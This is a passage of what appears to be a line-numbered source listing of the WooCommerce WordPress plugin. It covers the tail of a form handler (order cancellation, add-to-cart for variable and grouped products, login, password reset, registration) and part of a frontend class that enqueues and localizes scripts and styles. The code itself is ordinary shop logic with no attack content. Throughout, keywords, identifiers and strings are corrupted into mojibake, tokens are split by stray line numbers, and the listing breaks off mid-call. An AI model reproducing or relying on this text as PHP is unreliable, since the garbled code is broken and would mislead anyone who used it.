	`wc_add_nÙiû
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_ÿnûÎed_nÙiû', 
	`__
( 'Your order was cancelled.', 'woocommerce' ) ),‡pply_filters( 'woocommerce_order_cancelled_notice_type', 'notice' ) );

522 
	`do_aùiÚ
Ğ'woocomm”û_ÿnûÎed_Üd”', 
$Üd”
->
id
 );

524 } 
	`–£if
 ( 
$u£r_ÿn_ÿnûl
 && ! 
$Üd”_ÿn_ÿnûl
 ) {

525 
	`wc_add_nÙiû
Ğ
	`__
( 'Your order can‚o†onger be cancelled. Please contact us if you‚eed‡ssistance.', 'woocommerce' ), 'error' );

527 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid order.', 'woocommerce' ), 'error' );

530 iàĞ
$»dœeù
 ) {

531 
	`wp_§ã_»dœeù
Ğ
$»dœeù
 );

532 
ex™
;

535 
	}
}

544 
public
 
funùiÚ
 
	$add_to_ÿ¹_aùiÚ
Ğ
$u¾
 = 
çl£
 ) {

545 iàĞ
	`em±y
Ğ
$_REQUEST
['add-to-ÿ¹'] ) || ! 
	`is_num”ic
( $_REQUEST['add-to-cart'] ) ) {

549 
$´oduù_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_´oduù_id', 
	`absšt
Ğ
$_REQUEST
['add-to-cart'] ) );

550 
$was_added_to_ÿ¹
 = 
çl£
;

551 
$added_to_ÿ¹
 = 
	`¬¿y
();

552 
$addšg_to_ÿ¹
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

553 
$add_to_ÿ¹_hªdËr
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_hªdËr', 
$addšg_to_ÿ¹
->
´oduù_ty³
, $adding_to_cart );

556 iàĞ'v¬ŸbË' ==ğ
$add_to_ÿ¹_hªdËr
 ) {

558 
$v¬ŸtiÚ_id
 = 
	`em±y
Ğ
$_REQUEST
['v¬ŸtiÚ_id'] ) ? '' : 
	`absšt
( $_REQUEST['variation_id'] );

559 
$quªt™y
 = 
	`em±y
Ğ
$_REQUEST
['quªt™y'] ) ? 1 : 
	`­¶y_f‹rs
( 'woocommerce_stock_amount', $_REQUEST['quantity'] );

560 
$®l_v¬ŸtiÚs_£t
 = 
Œue
;

561 
$v¬ŸtiÚs
 = 
	`¬¿y
();

564 iàĞ
	`em±y
Ğ
$v¬ŸtiÚ_id
 ) ) {

565 
	`wc_add_nÙiû
Ğ
	`__
( 'Please choose…roduct options&hellip;', 'woocommerce' ), 'error' );

569 
$©Œibu‹s
 = 
$addšg_to_ÿ¹
->
	`g‘_©Œibu‹s
();

570 
$v¬ŸtiÚ
 = 
	`g‘_´oduù
Ğ
$v¬ŸtiÚ_id
 );

573 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) {

574 iàĞ! 
$©Œibu‹
['is_variation'] ) {

578 
$xÚomy
 = '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] );

580 iàĞ
	`is£t
Ğ
$_REQUEST
[ 
$xÚomy
 ] ) ) {

584 
$v®ue
 = 
	`§n™ize_t™Ë
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_REQUEST
[ 
$xÚomy
 ] ) ) );

587 
$v®id_v®ue
 = 
$v¬ŸtiÚ
->
v¬ŸtiÚ_d©a
[ 
$xÚomy
 ];

590 iàĞ
$v®id_v®ue
 =ğ'' || $v®id_v®u=ğ
$v®ue
 ) {

591 iàĞ
$©Œibu‹
['is_taxonomy'] ) {

592 
$v¬ŸtiÚs
[ 
$xÚomy
 ] = 
$v®ue
;

596 
$İtiÚs
 = 
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

597 
	`fÜ—ch
 ( 
$İtiÚs
 
as
 
$İtiÚ
 ) {

598 iàĞ
	`§n™ize_t™Ë
Ğ
$İtiÚ
 ) =ğ
$v®ue
 ) {

599 
$v®ue
 = 
$İtiÚ
;

603 
$v¬ŸtiÚs
[ 
$xÚomy
 ] = 
$v®ue
;

610 
$®l_v¬ŸtiÚs_£t
 = 
çl£
;

613 iàĞ
$®l_v¬ŸtiÚs_£t
 ) {

615 
$·s£d_v®id©iÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_v®id©iÚ', 
Œue
, 
$´oduù_id
, 
$quªt™y
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚs
 );

617 iàĞ
$·s£d_v®id©iÚ
 ) {

618 iàĞ
	`WC
()->
ÿ¹
->
	`add_to_ÿ¹
Ğ
$´oduù_id
, 
$quªt™y
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚs
 ) ) {

619 
	`wc_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 );

620 
$was_added_to_ÿ¹
 = 
Œue
;

621 
$added_to_ÿ¹
[] = 
$´oduù_id
;

625 
	`wc_add_nÙiû
Ğ
	`__
( 'Please choose…roduct options&hellip;', 'woocommerce' ), 'error' );

630 } 
	`–£if
 ( 'grou³d' ==ğ
$add_to_ÿ¹_hªdËr
 ) {

632 iàĞ! 
	`em±y
Ğ
$_REQUEST
['quªt™y'] ) && 
	`is_¬¿y
( $_REQUEST['quantity'] ) ) {

634 
$quªt™y_£t
 = 
çl£
;

636 
	`fÜ—ch
 ( 
$_REQUEST
['quªt™y'] 
as
 
$™em
 => 
$quªt™y
 ) {

637 iàĞ
$quªt™y
 <= 0 ) {

641 
$quªt™y_£t
 = 
Œue
;

644 
$·s£d_v®id©iÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_v®id©iÚ', 
Œue
, 
$™em
, 
$quªt™y
 );

646 iàĞ
$·s£d_v®id©iÚ
 ) {

647 iàĞ
	`WC
()->
ÿ¹
->
	`add_to_ÿ¹
Ğ
$™em
, 
$quªt™y
 ) ) {

648 
$was_added_to_ÿ¹
 = 
Œue
;

649 
$added_to_ÿ¹
[] = 
$™em
;

654 iàĞ
$was_added_to_ÿ¹
 ) {

655 
	`wc_add_to_ÿ¹_mes§ge
Ğ
$added_to_ÿ¹
 );

658 iàĞ! 
$was_added_to_ÿ¹
 && ! 
$quªt™y_£t
 ) {

659 
	`wc_add_nÙiû
Ğ
	`__
( 'Please choosehe quantity of items you wisho‡ddo your cart&hellip;', 'woocommerce' ), 'error' );

663 } 
	`–£if
 ( 
$´oduù_id
 ) {

666 
	`wc_add_nÙiû
Ğ
	`__
( 'Please choose‡…roducto‡ddo your cart&hellip;', 'woocommerce' ), 'error' );

674 
$quªt™y
 = 
	`em±y
Ğ
$_REQUEST
['quªt™y'] ) ? 1 : 
	`­¶y_f‹rs
( 'woocommerce_stock_amount', $_REQUEST['quantity'] );

677 
$·s£d_v®id©iÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_v®id©iÚ', 
Œue
, 
$´oduù_id
, 
$quªt™y
 );

679 iàĞ
$·s£d_v®id©iÚ
 ) {

681 iàĞ
	`WC
()->
ÿ¹
->
	`add_to_ÿ¹
Ğ
$´oduù_id
, 
$quªt™y
 ) ) {

682 
	`wc_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 );

683 
$was_added_to_ÿ¹
 = 
Œue
;

684 
$added_to_ÿ¹
[] = 
$´oduù_id
;

691 iàĞ
$was_added_to_ÿ¹
 && 
	`wc_nÙiû_couÁ
( 'error' ) == 0 ) {

693 
$u¾
 = 
	`­¶y_f‹rs
( 'add_to_cart_redirect', $url );

696 iàĞ
$u¾
 ) {

697 
	`wp_§ã_»dœeù
Ğ
$u¾
 );

698 
ex™
;

702 
	`–£if
 ( 
	`g‘_İtiÚ
('woocommerce_cart_redirect_after_add') == 'yes' ) {

703 
	`wp_§ã_»dœeù
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_u¾
() );

704 
ex™
;

709 
	}
}

714 
public
 
funùiÚ
 
	$´oûss_logš
() {

715 iàĞ! 
	`em±y
Ğ
$_POST
['login'] ) && !ƒmpty( $_POST['_wpnonce'] ) ) {

717 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-login' );

719 
Œy
 {

720 
$üeds
 = 
	`¬¿y
();

722 
$v®id©iÚ_”rÜ
 = 
Ãw
 
	`WP_E¼Ü
();

723 
$v®id©iÚ_”rÜ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oûss_logš_”rÜs', $v®id©iÚ_”rÜ, 
$_POST
['username'], $_POST['password'] );

725 iàĞ
$v®id©iÚ_”rÜ
->
	`g‘_”rÜ_code
() ) {

726 
throw
 
Ãw
 
	`Exû±iÚ
Ğ'<¡rÚg>' . 
	`__
Ğ'E¼Ü', 'woocomm”û' ) . ':</¡rÚg> ' . 
$v®id©iÚ_”rÜ
->
	`g‘_”rÜ_mes§ge
() );

729 iàĞ
	`em±y
Ğ
$_POST
['username'] ) ) {

730 
throw
 
Ãw
 
	`Exû±iÚ
Ğ'<¡rÚg>' . 
	`__
( 'Error', 'woocommerce' ) . ':</strong> ' . __( 'Username is„equired.', 'woocommerce' ) );

733 iàĞ
	`em±y
Ğ
$_POST
['password'] ) ) {

734 
throw
 
Ãw
 
	`Exû±iÚ
Ğ'<¡rÚg>' . 
	`__
( 'Error', 'woocommerce' ) . ':</strong> ' . __( 'Password is„equired.', 'woocommerce' ) );

737 iàĞ
	`is_ema
Ğ
$_POST
['u£ºame'] ) && 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_u£ºame_äom_ema', 
Œue
 ) ) {

738 
$u£r
 = 
	`g‘_u£r_by
Ğ'ema', 
$_POST
['username'] );

740 iàĞ
	`is£t
Ğ
$u£r
->
u£r_logš
 ) ) {

741 
$üeds
['u£r_logš'] = 
$u£r
->
u£r_logš
;

743 
throw
 
Ãw
 
	`Exû±iÚ
Ğ'<¡rÚg>' . 
	`__
( 'Error', 'woocommerce' ) . ':</strong> ' . __( 'A user could‚ot be found withhisƒmail‡ddress.', 'woocommerce' ) );

747 
$üeds
['u£r_logš'] = 
$_POST
['username'];

750 
$üeds
['u£r_·sswÜd'] = 
$_POST
['password'];

751 
$üeds
['»memb”'] = 
	`is£t
Ğ
$_POST
['rememberme'] );

752 
$£cu»_cook›
 = 
	`is_s¦
(è? 
Œue
 : 
çl£
;

753 
$u£r
 = 
	`wp_signÚ
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_logš_üed’tŸls', 
$üeds
 ), 
$£cu»_cook›
 );

755 iàĞ
	`is_wp_”rÜ
Ğ
$u£r
 ) ) {

756 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
$u£r
->
	`g‘_”rÜ_mes§ge
() );

759 iàĞ! 
	`em±y
Ğ
$_POST
['redirect'] ) ) {

760 
$»dœeù
 = 
	`esc_u¾
Ğ
$_POST
['redirect'] );

761 } 
	`–£if
 ( 
	`wp_g‘_»ã»r
() ) {

762 
$»dœeù
 = 
	`esc_u¾
Ğ
	`wp_g‘_»ã»r
() );

764 
$»dœeù
 = 
	`esc_u¾
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

768 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'You‡»‚ow†ogged iÀa <¡rÚg>%s</¡rÚg>', 'woocomm”û' ), 
$u£r
->
di¥Ïy_Çme
 ) );

770 
	`wp_»dœeù
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_logš_»dœeù', 
$»dœeù
, 
$u£r
 ) );

771 
ex™
;

774 } 
	`ÿtch
 (
Exû±iÚ
 
$e
) {

776 
	`wc_add_nÙiû
Ğ
	`­¶y_f‹rs
('logš_”rÜs', 
$e
->
	`g‘Mes§ge
() ), 'error' );

780 
	}
}

785 
public
 
funùiÚ
 
	$´oûss_»£t_·sswÜd
() {

786 iàĞ! 
	`is£t
Ğ
$_POST
['wc_reset_password'] ) ) {

791 iàĞ
	`is£t
Ğ
$_POST
['user_login'] ) && isset( $_POST['_wpnonce'] ) ) {

792 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-lost_password' );

794 
WC_ShÜtcode_My_AccouÁ
::
	`»Œ›ve_·sswÜd
();

798 iàĞ
	`is£t
Ğ
$_POST
['password_1'] ) && isset( $_POST['password_2'] ) && isset( $_POST['reset_key'] ) && isset( $_POST['reset_login'] ) && isset( $_POST['_wpnonce'] ) ) {

801 
$u£r
 = 
WC_ShÜtcode_My_AccouÁ
::
	`check_·sswÜd_»£t_key
Ğ
$_POST
['reset_key'], $_POST['reset_login'] );

803 iàĞ
	`is_objeù
Ğ
$u£r
 ) ) {

806 
$¬gs
['key'] = 
	`wc_ş—n
Ğ
$_POST
['reset_key'] );

807 
$¬gs
['logš'] = 
	`wc_ş—n
Ğ
$_POST
['reset_login'] );

809 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-reset_password' );

811 iàĞ
	`em±y
Ğ
$_POST
['password_1'] ) ||ƒmpty( $_POST['password_2'] ) ) {

812 
	`wc_add_nÙiû
Ğ
	`__
( 'Pleaseƒnter your…assword.', 'woocommerce' ), 'error' );

813 
$¬gs
['form'] = 'reset_password';

816 iàĞ
$_POST
[ 'password_1' ] !== $_POST[ 'password_2' ] ) {

817 
	`wc_add_nÙiû
Ğ
	`__
( 'Passwords do‚ot match.', 'woocommerce' ), 'error' );

818 
$¬gs
['form'] = 'reset_password';

821 
$”rÜs
 = 
Ãw
 
	`WP_E¼Ü
();

822 
	`do_aùiÚ
Ğ'v®id©e_·sswÜd_»£t', 
$”rÜs
, 
$u£r
 );

823 iàĞ
$”rÜs
->
	`g‘_”rÜ_mes§ges
() ) {

824 
	`fÜ—ch
 ( 
$”rÜs
->
	`g‘_”rÜ_mes§ges
(è
as
 
$”rÜ
 ) {

825 
	`wc_add_nÙiû
Ğ
$”rÜ
, 'error');

829 iàĞ0 =ğ
	`wc_nÙiû_couÁ
( 'error' ) ) {

831 
WC_ShÜtcode_My_AccouÁ
::
	`»£t_·sswÜd
Ğ
$u£r
, 
$_POST
['password_1'] );

833 
	`do_aùiÚ
Ğ'woocomm”û_cu¡om”_»£t_·sswÜd', 
$u£r
 );

835 
	`wp_»dœeù
Ğ
	`add_qu”y_¬g
Ğ'»£t', 'Œue', 
	`»move_qu”y_¬g
Ğ
	`¬¿y
( 'key', 'login' ) ) ) );

836 
ex™
;

841 
	}
}

846 
public
 
funùiÚ
 
	$´oûss_»gi¡¿tiÚ
() {

847 iàĞ! 
	`em±y
Ğ
$_POST
['register'] ) ) {

849 
	`wp_v”ify_nÚû
Ğ
$_POST
['register'], 'woocommerce-register' );

851 iàĞ'no' ==ğ
	`g‘_İtiÚ
( 'woocommerce_registration_generate_username' ) ) {

852 
$_u£ºame
 = 
$_POST
['username'];

854 
$_u£ºame
 = '';

857 iàĞ'no' ==ğ
	`g‘_İtiÚ
( 'woocommerce_registration_generate_password' ) ) {

858 
$_·sswÜd
 = 
$_POST
['password'];

860 
$_·sswÜd
 = '';

863 
Œy
 {

865 
$v®id©iÚ_”rÜ
 = 
Ãw
 
	`WP_E¼Ü
();

866 
$v®id©iÚ_”rÜ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oûss_»gi¡¿tiÚ_”rÜs', $v®id©iÚ_”rÜ, 
$_u£ºame
, 
$_·sswÜd
, 
$_POST
['email'] );

868 iàĞ
$v®id©iÚ_”rÜ
->
	`g‘_”rÜ_code
() ) {

869 
throw
 
Ãw
 
	`Exû±iÚ
Ğ'<¡rÚg>' . 
	`__
Ğ'E¼Ü', 'woocomm”û' ) . ':</¡rÚg> ' . 
$v®id©iÚ_”rÜ
->
	`g‘_”rÜ_mes§ge
() );

872 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

874 
	`wc_add_nÙiû
Ğ
$e
->
	`g‘Mes§ge
(), 'error' );

879 
$u£ºame
 = ! 
	`em±y
Ğ
$_u£ºame
 ) ? 
	`wc_ş—n
( $_username ) : '';

880 
$ema
 = ! 
	`em±y
Ğ
$_POST
['ema'] ) ? 
	`§n™ize_ema
( $_POST['email'] ) : '';

881 
$·sswÜd
 = 
$_·sswÜd
;

884 iàĞ! 
	`em±y
Ğ
$_POST
['email_2'] ) ) {

885 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
	`__
( 'ERROR', 'woocommerce' ) . '</strong>: ' . __( 'Anti-spam field was filled in.', 'woocommerce' ), 'error' );

889 
$Ãw_cu¡om”
 = 
	`wc_ü—‹_Ãw_cu¡om”
Ğ
$ema
, 
$u£ºame
, 
$·sswÜd
 );

891 iàĞ
	`is_wp_”rÜ
Ğ
$Ãw_cu¡om”
 ) ) {

892 
	`wc_add_nÙiû
Ğ
$Ãw_cu¡om”
->
	`g‘_”rÜ_mes§ge
(), 'error' );

896 
	`wc_£t_cu¡om”_auth_cook›
Ğ
$Ãw_cu¡om”
 );

899 iàĞ
	`wp_g‘_»ã»r
() ) {

900 
$»dœeù
 = 
	`esc_u¾
Ğ
	`wp_g‘_»ã»r
() );

902 
$»dœeù
 = 
	`esc_u¾
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

905 
	`wp_»dœeù
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_»gi¡¿tiÚ_»dœeù', 
$»dœeù
 ) );

906 
ex™
;

908 
	}
}

911 
Ãw
 
WC_FÜm_HªdËr
();

	@includes/class-wc-frontend-scripts.php

1 <?
php


11 şas 
	cWC_FrÚ‹nd_Süts
 {

16 
public
 
funùiÚ
 
	$__cÚ¡ruù
 () {

17 
	`add_aùiÚ
Ğ'wp_’queue_süts', 
	`¬¿y
Ğ
$this
, 'load_scripts' ) );

18 
	`add_aùiÚ
Ğ'wp_´št_süts', 
	`¬¿y
Ğ
$this
, 'check_jquery' ), 25 );

19 
	`add_f‹r
Ğ'woocomm”û_’queue_¡yËs', 
	`¬¿y
Ğ
$this
, 'backwards_compat' ) );

26 
public
 
funùiÚ
 
	$g‘_¡yËs
() {

27  
	`­¶y_f‹rs
Ğ'woocomm”û_’queue_¡yËs', 
	`¬¿y
(

28 'woocomm”û-Ïyout' => 
	`¬¿y
(

29 '¤c' => 
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'h‰p:', 'h‰ps:' ), '', 
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/css/woocommerce-layout.css',

31 'v”siÚ' => 
WC_VERSION
,

34 'woocomm”û-sm®lsü“n' => 
	`¬¿y
(

35 '¤c' => 
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'h‰p:', 'h‰ps:' ), '', 
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/css/woocommerce-smallscreen.css',

37 'v”siÚ' => 
WC_VERSION
,

38 'medŸ' => 'Úly sü“Àªd (max-width: ' . 
	`­¶y_f‹rs
Ğ'woocomm”û_¡yË_sm®lsü“n_b»akpošt', 
$b»akpošt
 = '768px' ) . ')'

40 'woocomm”û-g’”®' => 
	`¬¿y
(

41 '¤c' => 
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'h‰p:', 'h‰ps:' ), '', 
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/css/woocommerce.css',

43 'v”siÚ' => 
WC_VERSION
,

47 
	}
}

55 
public
 
funùiÚ
 
	$lßd_süts
() {

56 
glob®
 
$po¡
, 
$wp
;

58 
$suffix
 = 
	`defšed
Ğ'SCRIPT_DEBUG' ) && 
SCRIPT_DEBUG
 ? '' : '.min';

59 
$lightbox_’
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_lightbox' ) =ğ'yes' ? 
Œue
 : 
çl£
;

60 
$ajax_ÿ¹_’
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_ajax_add_to_ÿ¹' ) =ğ'yes' ? 
Œue
 : 
çl£
;

61 
$as£ts_·th
 = 
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'h‰p:', 'h‰ps:' ), '', 
	`WC
()->
	`¶ugš_u¾
() ) . '/assets/';

62 
$äÚ‹nd_süt_·th
 = 
$as£ts_·th
 . 'js/frontend/';

65 
	`wp_»gi¡”_süt
Ğ'cho£n', 
$as£ts_·th
 . 'js/cho£n/cho£n.jqu”y' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '1.0.0', 
Œue
 );

66 
	`wp_»gi¡”_süt
Ğ'jqu”y-blockui', 
$as£ts_·th
 . 'js/jqu”y-blockui/jqu”y.blockUI' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '2.60', 
Œue
 );

67 
	`wp_»gi¡”_süt
Ğ'jqu”y-·ym’t', 
$as£ts_·th
 . 'js/jqu”y-·ym’t/jqu”y.·ym’t' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '1.0.2', 
Œue
 );

68 
	`wp_»gi¡”_süt
Ğ'wc-üed™-ÿrd-fÜm', 
$as£ts_·th
 . 'js/äÚ‹nd/üed™-ÿrd-fÜm' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-·ym’t' ), 
WC_VERSION
, 
Œue
 );

70 
	`wp_»gi¡”_süt
Ğ'wc-add-to-ÿ¹-v¬ŸtiÚ', 
$äÚ‹nd_süt_·th
 . 'add-to-ÿ¹-v¬ŸtiÚ' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

71 
	`wp_»gi¡”_süt
Ğ'wc-sšgË-´oduù', 
$äÚ‹nd_süt_·th
 . 'sšgË-´oduù' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

72 
	`wp_»gi¡”_süt
Ğ'wc-couÁry-£Ëù', 
$äÚ‹nd_süt_·th
 . 'couÁry-£Ëù' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

73 
	`wp_»gi¡”_süt
Ğ'wc-add»ss-i18n', 
$äÚ‹nd_süt_·th
 . 'add»ss-i18n' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

74 
	`wp_»gi¡”_süt
Ğ'jqu”y-cook›', 
$as£ts_·th
 . 'js/jqu”y-cook›/jqu”y.cook›' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '1.3.1', 
Œue
 );

77 iàĞ
$ajax_ÿ¹_’
 )

78 
	`wp_’queue_süt
Ğ'wc-add-to-ÿ¹', 
$äÚ‹nd_süt_·th
 . 'add-to-ÿ¹' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

80 iàĞ
	`is_ÿ¹
() )

81 
	`wp_’queue_süt
Ğ'wc-ÿ¹', 
$äÚ‹nd_süt_·th
 . 'ÿ¹' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'wc-couÁry-£Ëù' ), 
WC_VERSION
, 
Œue
 );

83 iàĞ
	`is_checkout
() ) {

85 iàĞ
	`g‘_İtiÚ
( 'woocommerce_enable_chosen' ) == 'yes' ) {

86 
	`wp_’queue_süt
Ğ'wc-cho£n', 
$äÚ‹nd_süt_·th
 . 'cho£n-äÚ‹nd' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'cho£n' ), 
WC_VERSION
, 
Œue
 );

87 
	`wp_’queue_¡yË
Ğ'woocomm”û_cho£n_¡yËs', 
$as£ts_·th
 . 'css/chosen.css' );

90 
	`wp_’queue_süt
Ğ'wc-checkout', 
$äÚ‹nd_süt_·th
 . 'checkout' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'woocomm”û', 'wc-couÁry-£Ëù', 'wc-add»ss-i18n' ), 
WC_VERSION
, 
Œue
 );

93 iàĞ
	`is_·ge
Ğ
	`g‘_İtiÚ
( 'woocommerce_myaccount_page_id' ) ) ) {

94 iàĞ
	`g‘_İtiÚ
( 'woocommerce_enable_chosen' ) == 'yes' ) {

95 
	`wp_’queue_süt
Ğ'wc-cho£n', 
$äÚ‹nd_süt_·th
 . 'cho£n-äÚ‹nd' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'cho£n' ), 
WC_VERSION
, 
Œue
 );

96 
	`wp_’queue_¡yË
Ğ'woocomm”û_cho£n_¡yËs', 
$as£ts_·th
 . 'css/chosen.css' );

100 iàĞ
	`is_add_·ym’t_m‘hod_·ge
() )

101 
	`wp_’queue_süt
Ğ'wc-add-·ym’t-m‘hod', 
$äÚ‹nd_süt_·th
 . 'add-·ym’t-m‘hod' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'woocomm”û' ), 
WC_VERSION
, 
Œue
 );

103 iàĞ
$lightbox_’
 && ( 
	`is_´oduù
(è|| ( ! 
	`em±y
Ğ
$po¡
->
po¡_cÚ‹Á
 ) && 
	`¡r¡r
( $post->post_content, '[product_page' ) ) ) ) {

104 
	`wp_’queue_süt
Ğ'´‘tyPhÙo', 
$as£ts_·th
 . 'js/´‘tyPhÙo/jqu”y.´‘tyPhÙo' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '3.1.5', 
Œue
 );

105 
	`wp_’queue_süt
Ğ'´‘tyPhÙo-š™', 
$as£ts_·th
 . 'js/´‘tyPhÙo/jqu”y.´‘tyPhÙo.š™' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y','´‘tyPhÙo' ), 
WC_VERSION
, 
Œue
 );

106 
	`wp_’queue_¡yË
Ğ'woocomm”û_´‘tyPhÙo_css', 
$as£ts_·th
 . 'css/prettyPhoto.css' );

109 iàĞ
	`is_´oduù
() )

110 
	`wp_’queue_süt
( 'wc-single-product' );

113 
	`wp_’queue_süt
Ğ'woocomm”û', 
$äÚ‹nd_süt_·th
 . 'woocomm”û' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-blockui' ), 
WC_VERSION
, 
Œue
 );

114 
	`wp_’queue_süt
Ğ'wc-ÿ¹-äagm’ts', 
$äÚ‹nd_süt_·th
 . 'ÿ¹-äagm’ts' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-cook›' ), 
WC_VERSION
, 
Œue
 );

117 
	`wp_loÿlize_süt
Ğ'woocomm”û', 'woocomm”û_·¿ms', 
	`­¶y_f‹rs
Ğ'woocomm”û_·¿ms', 
	`¬¿y
(

118 'ajax_u¾' => 
	`WC
()->
	`ajax_u¾
(),

119 'ajax_lßd”_u¾' => 
	`­¶y_f‹rs
Ğ'woocomm”û_ajax_lßd”_u¾', 
$as£ts_·th
 . 'images/ajax-loader@2x.gif' ),

122 
	`wp_loÿlize_süt
Ğ'wc-sšgË-´oduù', 'wc_sšgË_´oduù_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_sšgË_´oduù_·¿ms', 
	`¬¿y
(

123 'i18n_»quœed_¿tšg_‹xt' => 
	`esc_©Œ__
( 'Please select‡„ating', 'woocommerce' ),

124 '»v›w_¿tšg_»quœed' => 
	`g‘_İtiÚ
( 'woocommerce_review_rating_required' ),

127 
	`wp_loÿlize_süt
Ğ'wc-checkout', 'wc_checkout_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_checkout_·¿ms', 
	`¬¿y
(

128 'ajax_u¾' => 
	`WC
()->
	`ajax_u¾
(),

129 'ajax_lßd”_u¾' => 
	`­¶y_f‹rs
Ğ'woocomm”û_ajax_lßd”_u¾', 
$as£ts_·th
 . 'images/ajax-loader@2x.gif' ),

130 'upd©e_Üd”_»v›w_nÚû' => 
	`wp_ü—‹_nÚû
( "update-order-review" ),

131 '­¶y_coupÚ_nÚû' => 
	`wp_ü—‹_nÚû
( "apply-coupon" ),

132 'İtiÚ_gue¡_checkout' => 
	`g‘_İtiÚ
( 'woocommerce_enable_guest_checkout' ),

133 'checkout_u¾' => 
	`add_qu”y_¬g
Ğ'aùiÚ', 'woocomm”û_checkout', 
	`WC
()->
	`ajax_u¾
() ),

134 'is_checkout' => 
	`is_·ge
Ğ
	`wc_g‘_·ge_id
Ğ'checkout' ) ) && 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['Üd”-·y'] ) && ! 
	`is£t
( $wp->query_vars['order-received'] ) ? 1 : 0

137 
	`wp_loÿlize_süt
Ğ'wc-add»ss-i18n', 'wc_add»ss_i18n_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_add»ss_i18n_·¿ms', 
	`¬¿y
(

138 'loÿË' => 
	`jsÚ_’code
Ğ
	`WC
()->
couÁr›s
->
	`g‘_couÁry_loÿË
() ),

139 'loÿË_f›lds' => 
	`jsÚ_’code
Ğ
	`WC
()->
couÁr›s
->
	`g‘_couÁry_loÿË_f›ld_£ËùÜs
() ),

140 'i18n_»quœed_‹xt' => 
	`esc_©Œ__
( 'required', 'woocommerce' ),

143 
	`wp_loÿlize_süt
Ğ'wc-ÿ¹', 'wc_ÿ¹_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_ÿ¹_·¿ms', 
	`¬¿y
(

144 'ajax_u¾' => 
	`WC
()->
	`ajax_u¾
(),

145 'ajax_lßd”_u¾' => 
	`­¶y_f‹rs
Ğ'woocomm”û_ajax_lßd”_u¾', 
$as£ts_·th
 . 'images/ajax-loader@2x.gif' ),

146 'upd©e_shpšg_m‘hod_nÚû' => 
	`wp_ü—‹_nÚû
( "update-shipping-method" ),

149 
	`wp_loÿlize_süt
Ğ'wc-ÿ¹-äagm’ts', 'wc_ÿ¹_äagm’ts_·¿ms', 
	`­¶y_f‹rs
